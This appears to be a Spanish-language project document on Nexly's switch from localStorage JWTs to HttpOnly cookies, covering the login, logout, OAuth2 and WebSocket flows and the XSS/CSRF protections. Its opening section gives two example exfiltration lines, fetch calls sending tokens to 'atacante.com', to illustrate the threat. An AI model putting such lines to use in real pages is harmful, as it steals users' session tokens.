# Autenticación con cookies HttpOnly en Nexly

## El problema con localStorage y cookies JS

Cuando guardas un JWT en `localStorage` o en una cookie accesible desde JavaScript (`document.cookie`), cualquier script que se ejecute en la página puede leerlo:

```js
// Cualquier script malicioso puede hacer esto:
fetch('https://atacante.com/robar?token=' + localStorage.getItem('token'))

// O con cookies JS:
fetch('https://atacante.com/robar?token=' + document.cookie)
```

Este tipo de ataque se llama **XSS (Cross-Site Scripting)**. Basta con que un paquete npm comprometido, un anuncio externo o una inyección de HTML ejecute código en tu página para que el token quede expuesto.

---

## La solución: cookies HttpOnly

Una cookie HttpOnly es establecida por el **servidor** con la cabecera `Set-Cookie`:

```
Set-Cookie: nexly_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/
```

La diferencia clave es el flag `HttpOnly`: el navegador recibe la cookie, la almacena, y la envía automáticamente en cada petición al dominio — pero **bloquea cualquier acceso desde JavaScript**. `document.cookie` no la muestra. No hay forma de leerla desde JS.

```js
document.cookie // "" — la cookie HttpOnly no aparece
```

---

## Cómo funciona en Nexly

### Login / Register

```
POST /api/auth/login
Body: { email, contrasenha }

← HTTP 200
← Set-Cookie: nexly_token=eyJ...; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400
← Body: { id, nombreCompleto, nombreUsuario, ... }  ← solo el perfil, nunca el token
```

El frontend recibe el `UsuarioDTO` para mostrarlo en la UI, pero el token nunca llega a JavaScript. El navegador se encarga de guardarlo y enviarlo.

### Peticiones autenticadas

```
GET /api/publicaciones/feed
Cookie: nexly_token=eyJ...   ← el navegador lo añade automáticamente

← HTTP 200
← Body: [{ ... }, { ... }]
```

El frontend no necesita hacer nada especial. Axios solo necesita `withCredentials: true` para que el navegador incluya la cookie en peticiones cross-origin.

### Restaurar sesión al recargar

Como el token es HttpOnly, el store de Zustand no puede leerlo. Al recargar la página el store se vacía. Para restaurar la sesión:

```
GET /api/usuario/me
Cookie: nexly_token=eyJ...   ← el navegador la envía

← HTTP 200  → el backend valida el token y devuelve el perfil
← HTTP 401  → no hay cookie válida → redirigir a /login
```

Esto ocurre en `main.tsx` antes de montar la app.

### Logout

```
POST /api/auth/logout

← Set-Cookie: nexly_token=; HttpOnly; Path=/; Max-Age=0
```

El servidor sobreescribe la cookie con una vacía y `Max-Age=0`, lo que hace que el navegador la elimine inmediatamente.

### OAuth2 (Google)

El flujo OAuth2 redirige entre dominios, lo que hace imposible usar `SameSite=Strict`. Nexly usa `SameSite=Lax` para la cookie del callback de Google:

```
1. Frontend → GET /oauth2/authorization/google
2. Google autentica al usuario
3. Google → GET /login/oauth2/code/google (backend)
4. Backend valida, crea/actualiza usuario
5. Backend → redirect a http://localhost:5173/oauth2/callback
   Set-Cookie: nexly_token=eyJ...; HttpOnly; SameSite=Lax
6. Frontend /oauth2/callback → GET /api/usuario/me → obtiene el perfil
```

Con el sistema anterior, el token viajaba en la URL (`/oauth2/callback?token=eyJ...`), que queda registrada en el historial del navegador y en logs de servidores intermedios. Con HttpOnly el token nunca aparece en la URL.

---

## Los flags de la cookie explicados

| Flag | Qué hace |
|---|---|
| `HttpOnly` | JavaScript no puede leer la cookie |
| `Secure` | Solo se envía por HTTPS. **Activar en producción** |
| `SameSite=Strict` | Solo se envía en peticiones del mismo sitio (máxima protección CSRF) |
| `SameSite=Lax` | Se envía también en navegaciones top-level cross-site (necesario para OAuth2) |
| `Path=/` | La cookie se envía en todas las rutas del dominio |
| `Max-Age=86400` | Expira en 24h (igual que el JWT) |

---

## Protecciones activas

### Contra XSS
Un script malicioso no puede robar el token porque `HttpOnly` lo hace invisible para JavaScript.

### Contra CSRF
`SameSite=Strict` hace que el navegador no envíe la cookie en peticiones iniciadas desde otros dominios. Un formulario malicioso en `atacante.com` que apunte a `nexly.com/api/...` no recibirá la cookie.

> Si en el futuro se necesita `SameSite=None` (para embeds o apps móviles), habría que añadir un token CSRF explícito. Por ahora con `Strict` no es necesario.

---

## WebSocket

El WebSocket (`/ws`) es `permitAll` en Spring Security, por lo que la autenticación de las conexiones STOMP se gestiona a través del `JwtFilter` con un fallback al header `Authorization`. El navegador envía la cookie automáticamente en el handshake HTTP del WebSocket, por lo que la autenticación funciona sin cambios en el frontend.

---

## Configuración pendiente para producción

En [application.properties](../NexlyBack/src/main/resources/application.properties) o variables de entorno:

```
# Activar cuando el backend tenga HTTPS
COOKIE_SECURE=true
```

En `AuthController.java` y `OAuth2SuccessHandler.java` hay comentarios marcando las líneas donde cambiar `secure(false)` a `secure(true)`.
